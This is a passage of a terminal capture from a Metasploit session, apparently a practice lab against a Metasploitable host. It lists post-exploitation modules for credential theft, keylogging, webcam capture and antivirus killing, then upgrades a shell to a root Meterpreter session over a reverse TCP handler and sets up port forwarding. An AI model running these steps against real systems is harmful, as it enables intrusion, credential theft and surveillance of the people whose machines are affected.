+   125  post/osx/gather/enum_airport                                             normal     No     OS X Gather Airport Wireless Preferences
+   126  post/osx/gather/enum_chicken_vnc_profile                                 normal     No     OS X Gather Chicken of the VNC Profile
+   127  post/osx/gather/enum_colloquy                                            normal     No     OS X Gather Colloquy Enumeration
+   128  post/osx/gather/enum_keychain                                            normal     No     OS X Gather Keychain Enumeration
+   129  post/osx/gather/enum_messages                                            normal     No     OS X Gather Messages
+   130  post/osx/gather/enum_osx                                                 normal     No     OS X Gather Mac OS X System Information Enumeration
+   131  post/osx/gather/hashdump                                                 normal     No     OS X Gather Mac OS X Password Hash Collector
+   132  post/osx/gather/password_prompt_spoof                                    normal     No     OSX Password Prompt Spoof
+   133  post/osx/gather/safari_lastsession                                       normal     No     OSX Gather Safari LastSession.plist
+   134  post/osx/gather/vnc_password_osx                                         normal     No     OS X Display Apple VNC Password
+   135  post/osx/manage/mount_share                                              normal     No     OSX Network Share Mounter
+   136  post/osx/manage/record_mic                                               normal     No     OSX Manage Record Microphone
+   137  post/osx/manage/sonic_pi                                                 normal     No     OS X Manage Sonic Pi
+   138  post/osx/manage/vpn                                                      normal     No     OSX VPN Manager
+   139  post/osx/manage/webcam                                                   normal     No     OSX Manage Webcam
+   140  post/solaris/escalate/pfexec                                             normal     No     Solaris pfexec Upgrade Shell
+   141  post/solaris/escalate/srsexec_readline                  2007-05-07       normal     Yes    Solaris srsexec Arbitrary File Reader
+   142  post/solaris/gather/checkvm                                              normal     No     Solaris Gather Virtual Environment Detection
+   143  post/solaris/gather/enum_packages                                        normal     No     Solaris Gather Installed Packages
+   144  post/solaris/gather/enum_services                                        normal     No     Solaris Gather Configured Services
+   145  post/solaris/gather/hashdump                                             normal     No     Solaris Gather Dump Password Hashes for Solaris Systems
+   146  post/windows/capture/keylog_recorder                                     normal     No     Windows Capture Keystroke Recorder
+   147  post/windows/capture/lockout_keylogger                                   normal     No     Windows Capture Winlogon Lockout Credential Keylogger
+   148  post/windows/escalate/droplnk                                            normal     No     Windows Escalate SMB Icon LNK Dropper
+   149  post/windows/escalate/getsystem                                          normal     No     Windows Escalate Get System via Administrator
+   150  post/windows/escalate/golden_ticket                                      normal     No     Windows Escalate Golden Ticket
+   151  post/windows/escalate/ms10_073_kbdlayout                2010-10-12       normal     No     Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation
+   152  post/windows/escalate/screen_unlock                                      normal     No     Windows Escalate Locked Desktop Unlocker
+   153  post/windows/escalate/unmarshal_cmd_exec                2018-08-05       normal     No     Windows unmarshal post exploitation
+   154  post/windows/gather/ad_to_sqlite                                         normal     No     AD Computer, Group and Recursive User Membership to Local SQLite DB
+   155  post/windows/gather/arp_scanner                                          normal     No     Windows Gather ARP Scanner
+   156  post/windows/gather/bitcoin_jacker                                       normal     No     Windows Gather Bitcoin Wallet
+   157  post/windows/gather/bitlocker_fvek                                       normal     No     Bitlocker Master Key (FVEK) Extraction
+   158  post/windows/gather/cachedump                                            normal     No     Windows Gather Credential Cache Dump
+   159  post/windows/gather/checkvm                                              normal     No     Windows Gather Virtual Environment Detection
+   160  post/windows/gather/credentials/avira_password                           normal     No     Windows Gather Avira Password Extraction
+   161  post/windows/gather/credentials/bulletproof_ftp                          normal     No     Windows Gather BulletProof FTP Client Saved Password Extraction
+   162  post/windows/gather/credentials/coreftp                                  normal     No     Windows Gather CoreFTP Saved Password Extraction
+   163  post/windows/gather/credentials/credential_collector                     normal     No     Windows Gather Credential Collector
+   164  post/windows/gather/credentials/domain_hashdump                          normal     No     Windows Domain Controller Hashdump
+   165  post/windows/gather/credentials/dynazip_log             2001-03-27       normal     No     Windows Gather DynaZIP Saved Password Extraction
+   166  post/windows/gather/credentials/dyndns                                   normal     No     Windows Gather DynDNS Client Password Extractor
+   167  post/windows/gather/credentials/enum_cred_store                          normal     No     Windows Gather Credential Store Enumeration and Decryption Module
+   168  post/windows/gather/credentials/enum_laps                                normal     No     Windows Gather Credentials Local Administrator Password Solution
+   169  post/windows/gather/credentials/enum_picasa_pwds                         normal     No     Windows Gather Google Picasa Password Extractor
+   170  post/windows/gather/credentials/epo_sql                                  normal     No     Windows Gather McAfee ePO 4.6 Config SQL Credentials
+   171  post/windows/gather/credentials/filezilla_server                         normal     No     Windows Gather FileZilla FTP Server Credential Collection
+   172  post/windows/gather/credentials/flashfxp                                 normal     No     Windows Gather FlashFXP Saved Password Extraction
+   173  post/windows/gather/credentials/ftpnavigator                             normal     No     Windows Gather FTP Navigator Saved Password Extraction
+   174  post/windows/gather/credentials/ftpx                                     normal     No     Windows Gather FTP Explorer (FTPX) Credential Extraction
+   175  post/windows/gather/credentials/gpp                                      normal     No     Windows Gather Group Policy Preference Saved Passwords
+   176  post/windows/gather/credentials/heidisql                                 normal     No     Windows Gather HeidiSQL Saved Password Extraction
+   177  post/windows/gather/credentials/idm                                      normal     No     Windows Gather Internet Download Manager (IDM) Password Extractor
+   178  post/windows/gather/credentials/imail                                    normal     No     Windows Gather IPSwitch iMail User Data Enumeration
+   179  post/windows/gather/credentials/imvu                                     normal     No     Windows Gather Credentials IMVU Game Client
+   180  post/windows/gather/credentials/mcafee_vse_hashdump                      normal     No     McAfee Virus Scan Enterprise Password Hashes Dump
+   181  post/windows/gather/credentials/mdaemon_cred_collector                   excellent  No     Windows Gather MDaemonEmailServer Credential Cracking
+   182  post/windows/gather/credentials/meebo                                    normal     No     Windows Gather Meebo Password Extractor
+   183  post/windows/gather/credentials/mremote                                  normal     No     Windows Gather mRemote Saved Password Extraction
+   184  post/windows/gather/credentials/mssql_local_hashdump                     normal     No     Windows Gather Local SQL Server Hash Dump
+   185  post/windows/gather/credentials/nimbuzz                                  normal     No     Windows Gather Nimbuzz Instant Messenger Password Extractor
+   186  post/windows/gather/credentials/outlook                                  normal     No     Windows Gather Microsoft Outlook Saved Password Extraction
+   187  post/windows/gather/credentials/purevpn_cred_collector                   normal     No     Windows Gather PureVPN Client Credential Collector
+   188  post/windows/gather/credentials/razer_synapse                            normal     No     Windows Gather Razer Synapse Password Extraction
+   189  post/windows/gather/credentials/razorsql                                 normal     No     Windows Gather RazorSQL Credentials
+   190  post/windows/gather/credentials/rdc_manager_creds                        normal     No     Windows Gather Remote Desktop Connection Manager Saved Password Extraction
+   191  post/windows/gather/credentials/skype                                    normal     No     Windows Gather Skype Saved Password Hash Extraction
+   192  post/windows/gather/credentials/smartermail                              normal     No     Windows Gather SmarterMail Password Extraction
+   193  post/windows/gather/credentials/smartftp                                 normal     No     Windows Gather SmartFTP Saved Password Extraction
+   194  post/windows/gather/credentials/spark_im                                 normal     No     Windows Gather Spark IM Password Extraction
+   195  post/windows/gather/credentials/sso                                      normal     No     Windows Single Sign On Credential Collector (Mimikatz)
+   196  post/windows/gather/credentials/steam                                    normal     No     Windows Gather Steam Client Session Collector.
+   197  post/windows/gather/credentials/tortoisesvn                              normal     No     Windows Gather TortoiseSVN Saved Password Extraction
+   198  post/windows/gather/credentials/total_commander                          normal     No     Windows Gather Total Commander Saved Password Extraction
+   199  post/windows/gather/credentials/trillian                                 normal     No     Windows Gather Trillian Password Extractor
+   200  post/windows/gather/credentials/vnc                                      normal     No     Windows Gather VNC Password Extraction
+   201  post/windows/gather/credentials/windows_autologin                        normal     No     Windows Gather AutoLogin User Credential Extractor
+   202  post/windows/gather/credentials/winscp                                   normal     No     Windows Gather WinSCP Saved Password Extraction
+   203  post/windows/gather/credentials/wsftp_client                             normal     No     Windows Gather WS_FTP Saved Password Extraction
+   204  post/windows/gather/dnscache_dump                                        normal     No     Windows Gather DNS Cache
+   205  post/windows/gather/dumplinks                                            normal     No     Windows Gather Dump Recent Files lnk Info
+   206  post/windows/gather/enum_ad_bitlocker                                    normal     No     Windows Gather Active Directory BitLocker Recovery
+   207  post/windows/gather/enum_ad_computers                                    normal     No     Windows Gather Active Directory Computers
+   208  post/windows/gather/enum_ad_groups                                       normal     No     Windows Gather Active Directory Groups
+   209  post/windows/gather/enum_ad_managedby_groups                             normal     No     Windows Gather Active Directory Managed Groups
+   210  post/windows/gather/enum_ad_service_principal_names                      normal     No     Windows Gather Active Directory Service Principal Names
+   211  post/windows/gather/enum_ad_to_wordlist                                  normal     No     Windows Active Directory Wordlist Builder
+   212  post/windows/gather/enum_ad_user_comments                                normal     No     Windows Gather Active Directory User Comments
+   213  post/windows/gather/enum_ad_users                                        normal     No     Windows Gather Active Directory Users
+   214  post/windows/gather/enum_applications                                    normal     No     Windows Gather Installed Application Enumeration
+   215  post/windows/gather/enum_artifacts                                       normal     No     Windows Gather File and Registry Artifacts Enumeration
+   216  post/windows/gather/enum_av_excluded                                     normal     No     Windows Antivirus Exclusions Enumeration
+   217  post/windows/gather/enum_chrome                                          normal     No     Windows Gather Google Chrome User Data Enumeration
+   218  post/windows/gather/enum_computers                                       normal     No     Windows Gather Enumerate Computers
+   219  post/windows/gather/enum_db                                              normal     No     Windows Gather Database Instance Enumeration
+   220  post/windows/gather/enum_devices                                         normal     No     Windows Gather Hardware Enumeration
+   221  post/windows/gather/enum_dirperms                                        normal     No     Windows Gather Directory Permissions Enumeration
+   222  post/windows/gather/enum_domain                                          normal     No     Windows Gather Enumerate Domain
+   223  post/windows/gather/enum_domain_group_users                              normal     No     Windows Gather Enumerate Domain Group
+   224  post/windows/gather/enum_domain_tokens                                   normal     No     Windows Gather Enumerate Domain Tokens
+   225  post/windows/gather/enum_domain_users                                    normal     No     Windows Gather Enumerate Active Domain Users
+   226  post/windows/gather/enum_domains                                         normal     No     Windows Gather Domain Enumeration
+   227  post/windows/gather/enum_emet                                            normal     No     Windows Gather EMET Protected Paths
+   228  post/windows/gather/enum_files                                           normal     No     Windows Gather Generic File Collection
+   229  post/windows/gather/enum_hostfile                                        normal     No     Windows Gather Windows Host File Enumeration
+   230  post/windows/gather/enum_ie                                              normal     No     Windows Gather Internet Explorer User Data Enumeration
+   231  post/windows/gather/enum_logged_on_users                                 normal     No     Windows Gather Logged On User Enumeration (Registry)
+   232  post/windows/gather/enum_ms_product_keys                                 normal     No     Windows Gather Product Key
+   233  post/windows/gather/enum_muicache                                        normal     No     Windows Gather Enum User MUICache
+   234  post/windows/gather/enum_patches                                         normal     No     Windows Gather Applied Patches
+   235  post/windows/gather/enum_powershell_env                                  normal     No     Windows Gather Powershell Environment Setting Enumeration
+   236  post/windows/gather/enum_prefetch                                        normal     No     Windows Gather Prefetch File Information
+   237  post/windows/gather/enum_proxy                                           normal     No     Windows Gather Proxy Setting
+   238  post/windows/gather/enum_putty_saved_sessions                            normal     No     PuTTY Saved Sessions Enumeration Module
+   239  post/windows/gather/enum_services                                        normal     No     Windows Gather Service Info Enumeration
+   240  post/windows/gather/enum_shares                                          normal     No     Windows Gather SMB Share Enumeration via Registry
+   241  post/windows/gather/enum_snmp                                            normal     No     Windows Gather SNMP Settings Enumeration (Registry)
+   242  post/windows/gather/enum_termserv                                        normal     No     Windows Gather Terminal Server Client Connection Information Dumper
+   243  post/windows/gather/enum_tokens                                          normal     No     Windows Gather Enumerate Domain Admin Tokens (Token Hunter)
+   244  post/windows/gather/enum_tomcat                                          normal     No     Windows Gather Apache Tomcat Enumeration
+   245  post/windows/gather/enum_trusted_locations                               normal     No     Windows Gather Microsoft Office Trusted Locations
+   246  post/windows/gather/enum_unattend                                        normal     No     Windows Gather Unattended Answer File Enumeration
+   247  post/windows/gather/file_from_raw_ntfs                                   normal     No     Windows File Gather File from Raw NTFS
+   248  post/windows/gather/forensics/browser_history                            normal     No     Windows Gather Skype, Firefox, and Chrome Artifacts
+   249  post/windows/gather/forensics/duqu_check                                 normal     No     Windows Gather Forensics Duqu Registry Check
+   250  post/windows/gather/forensics/enum_drives                                normal     No     Windows Gather Physical Drives and Logical Volumes
+   251  post/windows/gather/forensics/imager                                     normal     No     Windows Gather Forensic Imaging
+   252  post/windows/gather/forensics/nbd_server                                 normal     No     Windows Gather Local NBD Server
+   253  post/windows/gather/forensics/recovery_files                             normal     No     Windows Gather Deleted Files Enumeration and Recovering
+   254  post/windows/gather/hashdump                                             normal     No     Windows Gather Local User Account Password Hashes (Registry)
+   255  post/windows/gather/local_admin_search_enum                              normal     Yes    Windows Gather Local Admin Search
+   256  post/windows/gather/lsa_secrets                                          normal     No     Windows Enumerate LSA Secrets
+   257  post/windows/gather/make_csv_orgchart                                    normal     No     Generate CSV Organizational Chart Data Using Manager Information
+   258  post/windows/gather/memory_grep                                          normal     No     Windows Gather Process Memory Grep
+   259  post/windows/gather/netlm_downgrade                                      normal     No     Windows NetLM Downgrade Attack
+   260  post/windows/gather/ntds_grabber                                         normal     No     NTDS Grabber
+   261  post/windows/gather/ntds_location                                        normal     No     Post Windows Gather NTDS.DIT Location
+   262  post/windows/gather/outlook                                              normal     No     Windows Gather Outlook Email Messages
+   263  post/windows/gather/phish_windows_credentials                            normal     No     Windows Gather User Credentials (phishing)
+   264  post/windows/gather/psreadline_history                                   normal     No     Windows Gather PSReadline History
+   265  post/windows/gather/resolve_sid                                          normal     No     Windows Gather Local User Account SID Lookup
+   266  post/windows/gather/reverse_lookup                                       normal     No     Windows Gather IP Range Reverse Lookup
+   267  post/windows/gather/screen_spy                                           normal     No     Windows Gather Screen Spy
+   268  post/windows/gather/smart_hashdump                                       normal     No     Windows Gather Local and Domain Controller Account Password Hashes
+   269  post/windows/gather/tcpnetstat                                           normal     No     Windows Gather TCP Netstat
+   270  post/windows/gather/usb_history                                          normal     No     Windows Gather USB Drive History
+   271  post/windows/gather/win_privs                                            normal     No     Windows Gather Privileges Enumeration
+   272  post/windows/gather/wmic_command                                         normal     No     Windows Gather Run Specified WMIC Command
+   273  post/windows/gather/word_unc_injector                                    normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+   274  post/windows/manage/add_user_domain                                      normal     No     Windows Manage Add User to the Domain and/or to a Domain Group
+   275  post/windows/manage/archmigrate                                          normal     No     Architecture Migrate
+   276  post/windows/manage/change_password                                      normal     No     Windows Manage Change Password
+   277  post/windows/manage/clone_proxy_settings                                 normal     No     Windows Manage Proxy Setting Cloner
+   278  post/windows/manage/delete_user                                          normal     No     Windows Manage Local User Account Deletion
+   279  post/windows/manage/download_exec                                        normal     No     Windows Manage Download and/or Execute
+   280  post/windows/manage/driver_loader                                        normal     No     Windows Manage Driver Loader
+   281  post/windows/manage/enable_rdp                                           normal     No     Windows Manage Enable Remote Desktop
+   282  post/windows/manage/enable_support_account                               normal     No     Windows Manage Trojanize Support Account
+   283  post/windows/manage/exec_powershell                                      normal     No     Windows Powershell Execution Post Module
+   284  post/windows/manage/forward_pageant                                      normal     No     Forward SSH Agent Requests To Remote Pageant
+   285  post/windows/manage/hashcarve                                            normal     No     Windows Local User Account Hash Carver
+   286  post/windows/manage/ie_proxypac                                          normal     No     Windows Manage Proxy PAC File
+   287  post/windows/manage/inject_ca                                            normal     No     Windows Manage Certificate Authority Injection
+   288  post/windows/manage/inject_host                                          normal     No     Windows Manage Hosts File Injection
+   289  post/windows/manage/killav                                               normal     No     Windows Post Kill Antivirus and Hips
+   290  post/windows/manage/migrate                                              normal     No     Windows Manage Process Migration
+   291  post/windows/manage/mssql_local_auth_bypass                              normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass
+   292  post/windows/manage/multi_meterpreter_inject                             normal     No     Windows Manage Inject in Memory Multiple Payloads
+   293  post/windows/manage/nbd_server                                           normal     No     Windows Manage Local NBD Server for Remote Disks
+   294  post/windows/manage/peinjector                                           normal     No     Peinjector
+   295  post/windows/manage/persistence_exe                                      normal     No     Windows Manage Persistent EXE Payload Installer
+   296  post/windows/manage/portproxy                                            normal     No     Windows Manage Set Port Forwarding With PortProxy
+   297  post/windows/manage/powershell/build_net_code           2012-08-14       excellent  No     Powershell .NET Compiler
+   298  post/windows/manage/powershell/exec_powershell                           normal     No     Windows Manage PowerShell Download and/or Execute
+   299  post/windows/manage/powershell/load_script                               normal     No     Load Scripts Into PowerShell Session
+   300  post/windows/manage/pptp_tunnel                                          normal     No     Windows Manage Remote Point-to-Point Tunneling Protocol
+   301  post/windows/manage/priv_migrate                                         normal     No     Windows Manage Privilege Based Process Migration 
+   302  post/windows/manage/pxeexploit                                           normal     No     Windows Manage PXE Exploit Server
+   303  post/windows/manage/reflective_dll_inject                                normal     No     Windows Manage Reflective DLL Injection Module
+   304  post/windows/manage/remove_ca                                            normal     No     Windows Manage Certificate Authority Removal
+   305  post/windows/manage/remove_host                                          normal     No     Windows Manage Host File Entry Removal
+   306  post/windows/manage/rid_hijack                                           normal     No     Windows Manage RID Hijacking
+   307  post/windows/manage/rollback_defender_signatures                         normal     No     Disable Windows Defender Signatures
+   308  post/windows/manage/rpcapd_start                                         normal     No     Windows Manage Remote Packet Capture Service Starter
+   309  post/windows/manage/run_as                                               normal     No     Windows Manage Run Command As User
+   310  post/windows/manage/run_as_psh                                           normal     No     Windows 'Run As' Using Powershell
+   311  post/windows/manage/sdel                                                 normal     No     Windows Manage Safe Delete
+   312  post/windows/manage/sticky_keys                                          normal     No     Sticky Keys Persistance Module
+   313  post/windows/manage/vmdk_mount                                           normal     No     Windows Manage VMDK Mount Drive
+   314  post/windows/manage/vss_create                                           normal     No     Windows Manage Create Shadow Copy
+   315  post/windows/manage/vss_list                                             normal     No     Windows Manage List Shadow Copies
+   316  post/windows/manage/vss_mount                                            normal     No     Windows Manage Mount Shadow Copy
+   317  post/windows/manage/vss_set_storage                                      normal     No     Windows Manage Set Shadow Copy Storage Space
+   318  post/windows/manage/vss_storage                                          normal     No     Windows Manage Get Shadow Copy Storage Info
+   319  post/windows/manage/wdigest_caching                                      normal     No     Windows Post Manage WDigest Credential Caching
+   320  post/windows/manage/webcam                                               normal     No     Windows Manage Webcam
+   321  post/windows/recon/computer_browser_discovery                            normal     No     Windows Recon Computer Browser Discovery
+   322  post/windows/recon/outbound_ports                                        normal     No     Windows Outbound-Filtering Rules
+   323  post/windows/recon/resolve_ip                                            normal     No     Windows Recon Resolve IP
+   324  post/windows/wlan/wlan_bss_list                                          normal     No     Windows Gather Wireless BSS Info
+   325  post/windows/wlan/wlan_current_connection                                normal     No     Windows Gather Wireless Current Connection Info
+   326  post/windows/wlan/wlan_disconnect                                        normal     No     Windows Disconnect Wireless Connection
+   327  post/windows/wlan/wlan_probe_request                                     normal     No     Windows Send Probe Request Packets
+   328  post/windows/wlan/wlan_profile                                           normal     No     Windows Gather Wireless Profile
+   329  post/android/gather/hashdump                                             normal     No     Android Gather Dump Password Hashes for Android Systems
+   330  post/brocade/gather/enum_brocade                                         normal     No     Brocade Gather Device General Information
+   331  post/hardware/automotive/mazda_ic_mover                                  normal     No     Mazda 2 Instrument Cluster Accelorometer Mover
+   332  post/linux/gather/enum_nagios_xi                        2018-04-17       normal     No     Nagios XI Enumeration
+   333  post/multi/gather/grub_creds                                             normal     No     Gather GRUB Password
+
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> 
+[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> search type:post meterpreter
+[0m
+Matching Modules
+================
+
+   #   Name                                            Disclosure Date  Rank    Check  Description
+   -   ----                                            ---------------  ----    -----  -----------
+   0   post/multi/gather/multi_command                                  normal  No     Multi Gather Run Shell Command Resource File
+   1   post/multi/gather/run_console_rc_file                            normal  No     Multi Gather Run Console Resource File
+   2   post/multi/gather/ubiquiti_unifi_backup                          normal  No     Multi Gather Ubiquiti UniFi Controller Backup
+   3   post/multi/manage/autoroute                                      normal  No     Multi Manage Network Route via Meterpreter Session
+   4   post/multi/manage/record_mic                                     normal  No     Multi Manage Record Microphone
+   5   post/multi/manage/shell_to_meterpreter                           normal  No     Shell to Meterpreter Upgrade
+   6   post/multi/recon/local_exploit_suggester                         normal  No     Multi Recon Local Exploit Suggester
+   7   post/windows/gather/arp_scanner                                  normal  No     Windows Gather ARP Scanner
+   8   post/windows/gather/wmic_command                                 normal  No     Windows Gather Run Specified WMIC Command
+   9   post/windows/manage/archmigrate                                  normal  No     Architecture Migrate
+   10  post/windows/manage/exec_powershell                              normal  No     Windows Powershell Execution Post Module
+   11  post/windows/manage/forward_pageant                              normal  No     Forward SSH Agent Requests To Remote Pageant
+   12  post/windows/manage/migrate                                      normal  No     Windows Manage Process Migration
+   13  post/windows/manage/multi_meterpreter_inject                     normal  No     Windows Manage Inject in Memory Multiple Payloads
+   14  post/windows/manage/powershell/exec_powershell                   normal  No     Windows Manage PowerShell Download and/or Execute
+   15  post/windows/manage/priv_migrate                                 normal  No     Windows Manage Privilege Based Process Migration 
+
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> 
+[0m[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options 
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set LHOST 192.168.58.131
+[0mLHOST => 192.168.58.131
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.168.58.131:36437 -> 192.168.58.129:6200 (192.168.58.129)
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set SESSION 1
+[0mSESSION => 1
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> run
+[0m
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 192.168.58.131:4433 
+[1m[34m[*][0m Sending stage (985320 bytes) to 192.168.58.129
+[1m[34m[*][0m Meterpreter session 2 opened (192.168.58.131:4433 -> 192.168.58.129:53410) at 2019-11-28 19:46:22 +0100
+[0m[1m[34m[*][0m Command stager progress: 100.00% (773/773 bytes)
+[1m[34m[*][0m Post module execution completed
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                Connection
+  --  ----  ----                   -----------                                                ----------
+  1         shell cmd/unix                                                                    192.168.58.131:36437 -> 192.168.58.129:6200 (192.168.58.129)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ metasploitable.localdomain  192.168.58.131:4433 -> 192.168.58.129:53410 (192.168.58.129)
+
+[4mmsf5[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > getid
+[0m[1m[31m[-][0m Unknown command: getid.
+[4mmeterpreter[0m > get[K[K[Khellp[Pp
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Mic Commands
+====================
+
+    Command       Description
+    -------       -----------
+    listen        listen to a saved audio recording via audio player
+    mic_list      list all microphone interfaces
+    mic_start     start capturing an audio stream from the target mic
+    mic_stop      stop capturing audio
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+[4mmeterpreter[0m > getuid
+[0mServer username: uid=0, gid=0, euid=0, egid=0
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > portfwd help
+[0mUsage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -R        Indicates a reverse port forward.
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+[4mmeterpreter[0m > portfwd list
+[0m
+No port forwards are currently active.
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > portfwd help
+[0mUsage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -R        Indicates a reverse port forward.
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+[4mmeterpreter[0m > portfwd -L [K[Kl 22 -r 19.[K2.168.58.131[C[C -r 192.168.58.131- -r 192.168.58.131p -r 192.168.58.131[C -r 192.168.58.1312 -r 192.168.58.1312 -r 192.168.58.131[C -l 22 -p 22 -r 192.168.58.131a -l 22 -p 22 -r 192.168.58.131d -l 22 -p 22 -r 192.168.58.131d -l 22 -p 22 -r 192.168.58.131
+[0m[1m[34m[*][0m Local TCP relay created: :22 <-> 192.168.58.131:22
+[4mmeterpreter[0m > netstat -tulpn | grep LISTEN
+[0m
+Connection list
+===============
+
+    Proto  Local address         Remote address        State        User  Inode  PID/Program name
+    -----  -------------         --------------        -----        ----  -----  ----------------
+    tcp    0.0.0.0:512           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:513           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:2049          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:514           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:55141         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:34056         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:44136         0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8009          0.0.0.0:*             LISTEN       110   0      
+    tcp    0.0.0.0:6697          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:3306          0.0.0.0:*             LISTEN       109   0      
+    tcp    0.0.0.0:1099          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6667          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:139           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:5900          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:111           0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:6000          0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:81            0.0.0.0:*             LISTEN       0     0      
+    tcp    0.0.0.0:8787          0.0.0.0:*             LISTEN       0     0      
